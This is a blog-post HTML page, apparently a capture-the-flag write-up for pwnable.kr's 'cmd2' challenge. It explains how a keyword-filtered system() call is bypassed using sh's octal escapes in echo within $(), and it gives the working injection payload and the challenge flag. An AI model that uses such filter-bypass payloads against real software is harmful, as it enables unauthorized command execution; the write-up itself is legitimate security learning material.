@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pwnablr.kr - cmd2 &middot; M1r4c13</title>
+<meta name="description" content="Pwnablr.kr - cmd2 -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">Pwnablr.kr - cmd2</h1>
+<p class="meta"><span class="mono meta-date">2017.01.31</span><span class="tags"><span class="chip mono">ctf</span><span class="chip mono">pwnable.kr</span></span></p>
+<div class="post-body"><p>Writeup for <em>cmd2</em> of <a href="http://pwnable.kr/play.php">pwnable</a><br>
+<a href="http://kksnote.logdown.com/posts/466634">(Ref)</a></p>
+<h3>0x00 Puzzle</h3>
+<pre><code>Daddy bought me a system command shell.
+but he put some filters to prevent me from playing with it without his permission...
+but I wanna play anytime I want!
+
+ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
+</code></pre>
+<h3>0x01 Explore</h3>
+<p><strong>ssh</strong></p>
+<pre><code class="language-bash">$ pwd
+/home/cmd2
+$ ls -l
+total 20
+-r-xr-sr-x 1 root cmd2_pwn 8794 Dec 21  2015 cmd2
+-rw-r--r-- 1 root root      586 Dec 21  2015 cmd2.c
+-r--r----- 1 root cmd2_pwn   30 Jul 14  2015 flag
+</code></pre>
+<p><strong>cmd2.c</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int filter(char* cmd){
+        int r=0;
+        r += strstr(cmd, &quot;=&quot;)!=0;
+        r += strstr(cmd, &quot;PATH&quot;)!=0;
+        r += strstr(cmd, &quot;export&quot;)!=0;
+        r += strstr(cmd, &quot;/&quot;)!=0;
+        r += strstr(cmd, &quot;`&quot;)!=0;
+        r += strstr(cmd, &quot;flag&quot;)!=0;
+        return r;
+}
+
+extern char** environ;
+void delete_env(){
+        char** p;
+        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
+}
+
+int main(int argc, char* argv[], char** envp){
+        delete_env();
+        putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);
+        if(filter(argv[1])) return 0;
+        printf(&quot;%s\n&quot;, argv[1]);
+        system( argv[1] );
+        return 0;
+}
+</code></pre>
+<p>This time the program filters out our solution of <em>cmd1</em> by <code>delete_env();</code></p>
+<p>We need to find a new way to let the <em>cmd2</em> to execute <code>/bin/cat ~/flag</code> for us.</p>
+<p>Since the program delete all the env variables and reset the PATH to something useless, we <strong>must try to use '/' in our payload</strong>, which means we have to bypass the '/' checking, which remind us (hopefully) some coding methods (like base64 etc.).</p>
+<p><strong>Key points</strong></p>
+<ul>
+<li>
+<p>There are many differens between <code>sh</code> and <code>bash</code>. This program is using <code>system(command)</code> which actually <code>execl("/bin/sh", "sh", "-c", command, (char *) 0);</code> , which means it would run command with <code>sh</code> rather than <code>bash</code>. <a href="http://man7.org/linux/man-pages/man3/system.3.html">(ref)</a></p>
+</li>
+<li>
+<p><code>echo '\57'</code> echo has quite different behaviors under <code>sh</code> and <code>bash</code>, see below:</p>
+</li>
+</ul>
+<pre><code class="language-bash">$ sh
+$ echo '\57'
+/
+$ bash
+cmd2@ubuntu:~$ echo '\57'
+\57
+</code></pre>
+<p>We can use this trick to bypass the '/' checking. But how to execute the result string of echo while the backtick character is blocked?</p>
+<ul>
+<li><code>'...$(...)...'</code> point is at the apostrophe, both under <code>sh</code> and <code>bash</code>:</li>
+<li>
+<p>if you type <code>./binary "arg $(whoami)"</code>, it will first execute whatever inside $()</p>
+</li>
+<li>
+<p>but if you type <code>./binary 'arg $(whoami)'</code>, it will take all the stuff inside <code>''</code> as the arg and pass it to binary.</p>
+</li>
+</ul>
+<p>To make it clear:</p>
+<pre><code class="language-bash">$ bash
+cmd2@ubuntu:/tmp$ cat test.py 
+import sys
+print sys.argv[1]
+cmd2@ubuntu:/tmp$ python test.py &quot;arg $(whoami)&quot;
+arg cmd2
+cmd2@ubuntu:/tmp$ python test.py 'arg $(whoami)'
+arg $(whoami)
+cmd2@ubuntu:/tmp$ sh
+$ python test.py &quot;arg $(whoami)&quot;
+arg cmd2
+$ python test.py 'arg $(whoami)'
+arg $(whoami)
+</code></pre>
+<p>So at this point, we can try to construct our payload:</p>
+<pre><code>~/cmd2 '$(echo &quot;\57bin\57cat ~\57flag'
+</code></pre>
+<p>But <strong>remember that</strong> the <code>~</code> is no long worked after deleting all the env vars and there still is 'flag' checking.</p>
+<ul>
+<li>
+<p>For the first part, just replace <code>~</code> with <code>/home/cmd2</code></p>
+</li>
+<li>
+<p>For the second part, you can try other way like <code>ln</code> or even base64 decoding, or you just simply split the 'flag' to 'f' and 'lag' etc..</p>
+</li>
+</ul>
+<h3>0x02 Solution</h3>
+<p>Final payload: <code>~/cmd2 '$(echo "\57bin\57cat \57home\57cmd2\57f")lag'</code></p>
+<pre><code class="language-bash">cmd2@ubuntu:~$ ~/cmd2 '$(echo &quot;\57bin\57cat \57home\57cmd2\57f&quot;)lag'
+$(echo &quot;\57bin\57cat \57home\57cmd2\57f&quot;)lag
+FuN_w1th_5h3ll_v4riabl3s_haha
+</code></pre>
+<p>Done!</p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
